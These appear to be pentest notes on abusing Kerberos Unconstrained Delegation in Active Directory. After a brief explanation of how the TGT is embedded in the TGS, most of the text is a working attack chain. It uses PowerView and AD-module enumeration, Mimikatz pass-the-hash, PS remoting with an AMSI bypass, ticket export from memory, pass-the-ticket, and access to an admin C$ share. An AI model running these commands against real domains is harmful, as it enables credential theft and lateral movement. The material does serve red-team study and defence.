When the incoming user presents its TGS to the first hop server (Which has Unconstrained Delegation), user's TGT is embeded (DC embeds the TGT in the TGS) in the TGS. User's TGT is later used by the first hop server to authenticate to the DC. The DC presents the TGS for the second hoping server or service. The first hoping can then access the second server or service.

Steps to Identify Unconstrained Delegation:
• PowerView Module
    • Get-NetComputer -UnConstrained --> Using PowerView Module

• AD Module
    • Get-ADComputer -Filter {TrustedForDelegation -eq $True} --> Using AD Module
    • Get-ADUser -Filter {TrustedForDelegation -eq $True} --> Using AD Module
• Compromised the server that is performing Unconstrained delagation OR Get the ntlm hash for the user / machine account that has Unconstrained Delegation enabled.
• Login as Local admin to the server on which Uncontrained delegation is allowed. (Using Pash the hash technique - Run PowerShell with Admin Access)
    • Open a PowerShell with Local Admin rights
    • Import Invoke-Mimikatz.ps1
    • Run sekurlsa::pth /user:username /domain:FQDN_DOMAIN_Name /ntlm:Hash_of_the_user /run:powershell.exe
        • Check whether user (where unconstrained delegation is enabled) has local admin access to DA machine.
        • Use PS remoting to access the server where unconstrained delegation is enabled
            • $sess = New-PSSession -ComputerName affected_Server
            • Enter-PSSession -Session $sess 
            • Run AMSIBypass code
            • Invoke-Command -Session $sess -File Invoke-Mimikatz.ps1
            • Enter-PSSession -Session $sess
            • To Extract TGT from the memory
                • Invoke-Mimikatz -Command '"sekurlsa::tickets /export"' --> To export all TGS from the affected server.
            • To reuse the ticket
                • Invoke-Mimikatz -Command '"kerberos::ptt ticket_name.kirbi"' --> Tickets can be reused
            • Access the service
                • Ex: ls \\FQDN_NAME_OF_The_Server\C$
